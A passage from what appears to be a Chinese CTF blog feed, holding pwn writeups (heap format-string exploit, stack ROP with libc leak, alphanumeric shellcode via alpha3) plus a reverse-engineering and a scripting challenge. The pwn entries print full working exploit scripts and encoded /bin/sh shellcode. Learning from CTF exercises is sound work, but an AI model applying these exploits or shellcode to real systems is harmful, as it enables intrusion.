0xa4	0xdc	0x6c	0x3b	0x21</span></span><br><span class="line"><span class="string">0x2e	0xab	0x32	0x5c	0x7b	0xe0	0x9d	0x6a</span></span><br><span class="line"><span class="string">0x39	0x14	0x3c	0xb8	0x0a	0x53	0xf7	0xdd</span></span><br><span class="line"><span class="string">0xf4	0x2c	0x98	0xba	0x05	0xe1	0x0e	0xa3</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">L = str.split()</span><br><span class="line">L = [int(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> L]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> List:</span><br><span class="line">    flag += chr(L.index(i))</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>随手小记</category>
      </categories>
  </entry>
  <entry>
    <title>xman_2019_format(堆上格式化字符串)</title>
    <url>/2020/09/18/xman-2019-format-%E5%A0%86%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/dva-overwatch-reading-book-ow.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>曾经也遇到过<code>堆上格式化字符串漏洞</code>类型的题目，但是咕了许久以后再次遇到这种类型的题目，捣鼓半天而且借助WP才搞出来……</p><p>特此写篇博客记录一下以加深印象。</p><p>题目在BUUCTF上可以找到.</p><h1 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01 程序分析"></a>0x01 程序分析</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><p>buf不在栈上，而是通过malloc申请的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>u);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x37</span>u);</span><br></pre></td></tr></table></figure><p>然后将buf作为参数，进入sub_80485C4函数内，该函数存在格式化字符串漏洞，不过只能单次利用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">sub_80485C4</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"..."</span>);</span><br><span class="line">  v1 = strtok(s, <span class="string">"|"</span>);<span class="comment">//相当于split(s,"|")</span></span><br><span class="line">  <span class="built_in">printf</span>(v1);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = strtok(<span class="number">0</span>, <span class="string">"|"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(result);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序存在后门函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:080485AB ; __unwind &#123;</span><br><span class="line">.text:080485AB push    ebp</span><br><span class="line">.text:080485AC mov     ebp, esp</span><br><span class="line">.text:080485AE sub     esp, 8</span><br><span class="line">.text:080485B1 sub     esp, 0Ch</span><br><span class="line">.text:080485B4 push    offset command  ; &quot;/bin/sh&quot;</span><br><span class="line">.text:080485B9 call    _system</span><br><span class="line">.text:080485BE add     esp, 10h</span><br><span class="line">.text:080485C1 nop</span><br><span class="line">.text:080485C2 leave</span><br><span class="line">.text:080485C3 retn</span><br><span class="line">.text:080485</span><br></pre></td></tr></table></figure><h1 id="0x02-重点与思路"><a href="#0x02-重点与思路" class="headerlink" title="0x02 重点与思路"></a>0x02 重点与思路</h1><p>利用格式化字符串漏洞将返回地址改为后门函数</p><h2 id="一条重点"><a href="#一条重点" class="headerlink" title="一条重点"></a>一条重点</h2><p>对于<code>%ac$xn</code>，其中a为个数，x是偏移，如果此处地址里面存放的依旧是个指针(地址)，那么会向里面存放的指针所指向的地方写入数据。</p><p>即 A-&gt;B-&gt;C,A和B都是地址，则最后数据会写到C处。</p><h2 id="稍作调试"><a href="#稍作调试" class="headerlink" title="稍作调试"></a>稍作调试</h2><p>在第一个printf(0x080485F6)的位置下断点，运行，然后查看栈。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200918171501.png" alt></p><p>可以看到这两处是可以作为跳板的</p><p>ebp位置的位于偏移0xa处，下面的位于偏移0x12处</p><p><strong>不过即便每次运行的时候栈地址都会变动，但是偏移0x13处的最后一位总会是c，比如会是0c、1c、2c…..ec、fc。这便为我们爆破提供的条件。</strong></p><h2 id="确定思路"><a href="#确定思路" class="headerlink" title="确定思路"></a>确定思路</h2><p>以图为例，如果我们利用<code>那条重点</code>对偏移0xa处进行写入</p><p>则数据会写到如图0xffe5a238处(即修改0xffe5a238为其他值)</p><p>那么如果将0xffe5a238修改为0xffe5a20c</p><p>那么偏移0x12处也便指向了0xffe5a20c</p><p>偏移0x12处将变成: <code>0xffe5a208 -&gt; 0xffe5a20c -&gt; 0x8048697</code>的形式。(如果问为什么没有图，那是因为手残把gdb给关了…. 地址每次都是随机的，还原不回上图的值了，为了不让读者因地址变动而产生疑惑，只能用文字表示了。)</p><p>那么我们可以通过格式化字符串和<code>那条重点</code>对偏移0x12处进行写入，即修改0x8048697的值为后门函数地址。</p><p>因为栈地址是随机的，所以采用爆破。</p><h1 id="0x03-完整EXP"><a href="#0x03-完整EXP" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = process(<span class="string">'./fmt'</span>)</span><br><span class="line">    <span class="comment">#c = remote('node3.buuoj.cn',26254)</span></span><br><span class="line">    elf = ELF(<span class="string">'./fmt'</span>)</span><br><span class="line"></span><br><span class="line">    backdoor = <span class="number">0x080485ab</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(c,'b * 0x080485F6')</span></span><br><span class="line"></span><br><span class="line">    c.recvuntil(<span class="string">'...\n'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'...\n'</span>)</span><br><span class="line">    payload = <span class="string">'%12c%10$hhn'</span> <span class="comment">#使偏移0x12处栈指向0x13偏移处(看运气,概率理论上是1/16)，这里可以选12(0x0c)也可以选0x1c、0x2c...0xfc都可以，反正都要爆破的...</span></span><br><span class="line">    payload += <span class="string">'|%34219c%18$hn'</span> <span class="comment">#修改返回地址为后门函数，因为只有后两字节不同，所以是$hn。</span></span><br><span class="line">    <span class="comment">#如果看懂了前面的重点与思路，理解payload应该是挺容易的。关键还是A-&gt;B-&gt;C,AB均为地址,数据会写到C处这条性质。</span></span><br><span class="line">    c.send(payload)</span><br><span class="line"></span><br><span class="line">    c.recvuntil(<span class="string">'...'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'...'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c.sendline(<span class="string">'echo aaaa'</span>)</span><br><span class="line">        c.recvuntil(<span class="string">'aaaa'</span>,timeout = <span class="number">1</span>)</span><br><span class="line">        c.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        c.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://www.yuque.com/u239977/cbzkn3/biczbd" target="_blank" rel="noopener">语雀</a></p>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>一道有(我)意(好)思(菜)的stack题目</title>
    <url>/2020/03/29/%E4%B8%80%E9%81%93%E6%9C%89-%E6%88%91-%E6%84%8F-%E5%A5%BD-%E6%80%9D-%E8%8F%9C-%E7%9A%84stack%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_78972967_20200125_131238.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这是大佬发我的题目，看名字挺easy，但是做起来却是…</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/3930e380f3d08436.jpg" alt></p><p><strong>由于<code>Rules</code>的规定，这里不写明题目的名字以及题目的来源</strong>，这篇博文主要为了自己日后复习。</p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200329213454.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200329213649.png" alt></p><p>本以为是easy的一道rop，但是当我<code>checksec</code>以后…</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200329213746.jpg" alt></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>开着PIE、FULL RELRO、NX….555555，不过幸亏没开canary…</p><p>题目变得棘手起来</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200329214003.png" alt></p><p>这里返回地址似乎可以利用一下，不过利用之前要先修改一下。</p><p>通过<code>disassemble 0x7ffff7a05b97</code>命令可以查看这个地址附近的反汇编</p><p>当我们执行完main的leave和ret以后</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200329214338.png" alt></p><p>可以注意到，程序执行到<code>0x00007ffff7a05b97</code>，但是注意此处的前两条汇编，这是在call rax，而rax存着<code>rsp+0x18</code>的内容，来看一下<code>rsp+0x18</code>里面存的什么</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/gx $rsp+<span class="number">0x18</span></span><br><span class="line"><span class="number">0x7fffffffdd68</span>:	<span class="number">0x00005555555549c4</span></span><br></pre></td></tr></table></figure><p>里面存的是main函数的起始地址… 太巧了！</p><p>如果把原本main的返回地址<code>0x00007ffff7a05b97</code>修改为<code>0x00007ffff7a05b90</code>，那就可以让程序再次执行main函数，并且还能通过main函数里面的puts连带泄露出__libc_start_main的地址，然后one_gadget再次构造payload即可。</p><h1 id="0x02-完整EXP"><a href="#0x02-完整EXP" class="headerlink" title="0x02 完整EXP"></a>0x02 完整EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#c = process('./stack')</span></span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'**************'</span>,*****)</span><br><span class="line">elf = ELF(<span class="string">'./stack'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'b'</span>*<span class="number">8</span> + <span class="string">'\x90'</span></span><br><span class="line">c.sendline(payload)<span class="comment">#Look here,using sendline</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'aabbbbbbbb'</span>)</span><br><span class="line">addr = u64(c.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_start_main = addr + <span class="number">7</span> - <span class="number">231</span></span><br><span class="line">libcbase = libc_start_main - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">success(hex(libcbase))</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'b'</span>*<span class="number">8</span> + p64(libcbase + <span class="number">0x4f2c5</span>)<span class="comment">#one_gadget</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>exp中注释的位置用的sendline，这也是因为main的<code>read_n</code>函数是如下代码</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200329214944.png" alt></p><p>这也使得<code>\n</code>或者<code>\x00</code>不会覆盖掉其他地方。</p><p>由于<code>Rules</code>的规定，remote里的host和port这里不写出来。</p><p>确实挺有意思的一道题目，奇怪的知识增加了。</p>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>实验吧-Ascii艺术</title>
    <url>/2019/05/12/%E5%AE%9E%E9%AA%8C%E5%90%A7-Ascii%E8%89%BA%E6%9C%AF/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/026_Ariesbto_EV103A.png" alt></p><a id="more"></a><ul><li>今天又来逛了逛实验吧。</li><li>找了道编程题玩玩。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190512225642.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190512225710.png" alt></p><ul><li><p>像这样, 第一时间考虑到用requests库配合正则表达式进行自动提交。</p></li><li><p>然鹅…要哭了…</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190512225834.png" alt></p><ul><li><p>这样的话,只能挨个对应了。</p></li><li><p>有个大坑点… 这个是 9 而不是 4</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190512225924.png" alt></p><ul><li>脚本附上(Python2): 新手脚本, 勿喷…</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/ppc/acsii.php'</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">text = s.get(url).content</span><br><span class="line"></span><br><span class="line">z = <span class="string">r'red"&gt;(.*)&lt;/div&gt;'</span></span><br><span class="line"></span><br><span class="line">str = re.search(z,text).group()</span><br><span class="line"></span><br><span class="line">res = str.replace(<span class="string">'red"&gt;'</span>,<span class="string">''</span>).replace(<span class="string">'xxxxx&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;&amp;nbsp;xxxx&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;xxxxx'</span>,<span class="string">'5'</span>).replace(<span class="string">'&amp;nbsp;xx&lt;br&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br&gt;&amp;nbsp;&amp;nbsp;x&amp;nbsp;&amp;nbsp;&lt;br&gt;xxxxx'</span>,<span class="string">'1'</span>).replace(<span class="string">'&amp;nbsp;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;xxxxx&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x'</span>,<span class="string">'9'</span>).replace(<span class="string">'&amp;nbsp;xxx&amp;nbsp;&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;&amp;nbsp;xx&amp;nbsp;&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;xxx&amp;nbsp;'</span>,<span class="string">'8'</span>).replace(<span class="string">'&amp;nbsp;xxx&amp;nbsp;&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&lt;br /&gt;&amp;nbsp;xxx&amp;nbsp;'</span>,<span class="string">'0'</span>).replace(<span class="string">'&amp;nbsp;xxx&amp;nbsp;&lt;br /&gt;x&amp;nbsp;&amp;nbsp;&amp;nbsp;x&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;xx&amp;nbsp;&lt;br /&gt;&amp;nbsp;x&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;xxxxx'</span>,<span class="string">'2'</span>).replace(<span class="string">'&lt;br /&gt;'</span>,<span class="string">''</span>).replace(<span class="string">'&lt;br/&gt;'</span>,<span class="string">''</span>).replace(<span class="string">'&lt;/div&gt;'</span>,<span class="string">''</span>).replace(<span class="string">'&lt;br&gt;'</span>,<span class="string">''</span>)</span><br><span class="line"><span class="keyword">print</span> res</span><br><span class="line">data = &#123;<span class="string">'inputNumber'</span>:res&#125;</span><br><span class="line"><span class="keyword">print</span> s.post(url,data = data).content</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title>mrctf2020_shellcode_revenge</title>
    <url>/2020/09/23/mrctf2020-shellcode-revenge/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/61784497_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>刷到一道shellcode受限制的题目，自己尝试写shellcode，试了半天不行，最后查阅WP了解到有相关工具…..</p><p>特地记录一下</p><h1 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01 程序分析"></a>0x01 程序分析</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200923164859.png" alt></p><p>由于0x124D处的call指令导致F5反编译失败。</p><p>只能看汇编了。</p><p>根据汇编大概写出伪代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">输出 <span class="string">"Show me your magic!"</span></span><br><span class="line">读取 <span class="number">0x400</span>个字节到buf,buf位于栈, rbp - <span class="number">0x410</span></span><br><span class="line">遍历buf[i]</span><br><span class="line"><span class="keyword">if</span>(buf[i]不属于<span class="number">0x30</span>~<span class="number">0x5a</span> 或者 <span class="number">0x61</span>~<span class="number">0x7a</span>)&#123;</span><br><span class="line">	输出 <span class="string">"I Can't Read This!"</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	执行buf();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而且NX保护没开，所以向buf写入符合要求的shellcode即可。</p><h1 id="0x02-Do-it"><a href="#0x02-Do-it" class="headerlink" title="0x02 Do it!"></a>0x02 Do it!</h1><p>查阅一番资料以后</p><p>找到一篇非常不错的文章，虽然没能让我解出这道题目，但是从中学到不少姿势。</p><p><a href="https://xz.aliyun.com/t/6645" target="_blank" rel="noopener">Shellcode的艺术</a></p><p>去尝试了使用<code>shellcode_encoder</code>生成符合要求的shellcode，结果生成的shellcode里面依然含有不在题目要求范围内的字符。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.12</span> (default, Jul <span class="number">21</span> <span class="number">2020</span>, <span class="number">15</span>:<span class="number">19</span>:<span class="number">50</span>) </span><br><span class="line">[GCC <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">'shellcode_x64'</span>,<span class="string">'wb'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sc = asm(shellcraft.sh())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(sc)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python main.py shellcode_x64  rax</span><br><span class="line">Encoding stage2</span><br><span class="line">488b0432 =&gt; 4863343a31343a53582d692b6c722d21265870353e253f2f505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f</span><br><span class="line">480faf44 =&gt; 4863343a31343a53582d394f4f642d515f2020353e5e3f3f505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f</span><br><span class="line">32084889 =&gt; 4863343a31343a53582d576068292d482020203553773f3f505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f</span><br><span class="line">043a83c7 =&gt; 4863343a31343a53582d515a23232d7c40204035375f3f5b505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f</span><br><span class="line">0883c610 =&gt; 4863343a31343a53582d692b46722d5c20205e3533375f3f505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f</span><br><span class="line">85c075e8 =&gt; 4863343a31343a53582d202075492d21406020353a5f5f7e505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f</span><br><span class="line">Multiply-encoding stage3</span><br><span class="line">6a6848b82f62696e =&gt; 213339282e64403b 2a657a302621346e</span><br><span class="line">2f2f2f73504889e7 =&gt; 5f376c7274346e40 312a7d7e773c3f7d</span><br><span class="line">6872690101813424 =&gt; 58392e3534337d6e 6724682e6a376734</span><br><span class="line">0101010131f6566a =&gt; 775f695a3f256f51 47717c7b22375725</span><br><span class="line">085e4801e6564889 =&gt; 3738773f73217c4e 387e3f4442232a4d</span><br><span class="line">e631d26a3b580f05 =&gt; 413c7a24335b502e 6630522a7a37217c</span><br><span class="line">Assembling jump at +408</span><br><span class="line"></span><br><span class="line">Encoding preamble <span class="keyword">for</span> rdx &lt;- rax</span><br><span class="line">PZ</span><br><span class="line"></span><br><span class="line">Original length: 48</span><br><span class="line">Encoded length:  508</span><br><span class="line">Preamble length: 2</span><br><span class="line">Total length:    510</span><br><span class="line"></span><br><span class="line">PZTAYAXVI31VXPP[_Hc4:14:SX-i+lr-!&amp;Xp5&gt;%?/P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-9OOd-Q_  5&gt;^??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-W`h)-H   5Sw??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-QZ<span class="comment">##-|@ @57_?[P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-i+Fr-\  ^537_?P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-  uI-!@` 5:__~P^14:WX-_^/?-=apD-`@`|P_SX-"A`B-#`@~5#__?P_Hc4:14:SX- A $-3   5R|/+P^14:WX-_^/?-=apD-`@`|P_SX-@Ebi- \`Y5&lt;_==P^SX-_A1"-q@_~5(~o_P_AAAA!39(.d@;*ez0&amp;!4n_7lrt4n@1*&#125;~w&lt;?&#125;X9.543&#125;ng$h.j7g4w_iZ?%oQGq|&#123;"7W%78w?s!|N8~?DB#*MA&lt;z$3[P.f0R*z7!|</span></span><br></pre></td></tr></table></figure><p>最后了解到使用<code>alpha3</code>可以生成指定要求的shellcode，rax表示指向shellcode的寄存器(这道题是call rax，也就意味着rax是指向shellcode的)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">'shellcode_x64'</span> &gt; x64_out</span><br><span class="line"></span><br><span class="line">$ cat x64_out </span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure><p>…然后send(shellcode)就行了…</p><h1 id="0x03-完整EXP"><a href="#0x03-完整EXP" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#c = remote('node3.buuoj.cn',25514)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c,'b * $rebase(0x124D)')</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'x64_out'</span>,<span class="string">'rb'</span>)</span><br><span class="line"></span><br><span class="line">sc = f.read()</span><br><span class="line">f.close()</span><br><span class="line">c.recvuntil(<span class="string">'magic!\n'</span>)</span><br><span class="line">c.send(sc)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>实验吧-逆向观察</title>
    <url>/2019/05/10/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E9%80%86%E5%90%91%E8%A7%82%E5%AF%9F/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/122_Ariesbto_EV121A.png" alt></p><a id="more"></a><ul><li><p>今天逛了逛实验吧, 找了个难度为易的题练练手…</p></li><li><p>题目为rev50， 是一个elf文件,直接IDA载入后找到主函数。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190510231029.png" alt></p><ul><li>对src按r转换成字符串。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190510231116.png" alt></p><ul><li>根据题目逻辑,如果执行文件时没有参数输入,则提示:</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usage ./rev50 password</span><br></pre></td></tr></table></figure><ul><li><p>如果有参数传入, 则首先将src的内容通过memcpy函数赋值给dest。</p></li><li><p>则此时 dest 的内容就为 mercedes</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ( !strcmp(argv[1], (&amp;dict)[i]) &amp;&amp; !strcmp(&amp;dest, (&amp;dict)[i]) )</span><br></pre></td></tr></table></figure></li><li><p>根据这个逻辑, 如果输入(即angv[1])与 dict的其中一个相等,并且dest的内容与dict中的那一个相等,则提示 Good password,也就是我们的输入就是正确的flag。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190510231609.png" alt></p><ul><li>dict的内容… 根据上面的for循环,应该有999个…</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190510231658.png" alt></p><ul><li><p>在dict找到了 dest的内容,更加确定答案就是’mercedes’</p></li><li><p>所以最终答案就为:</p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mercedes</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>逆向</category>
      </categories>
  </entry>
  <entry>
    <title>[Unlink]-ZCTF-2016-note3</title>
    <url>/2020/02/06/Unlink-ZCTF-2016-note3/</url>
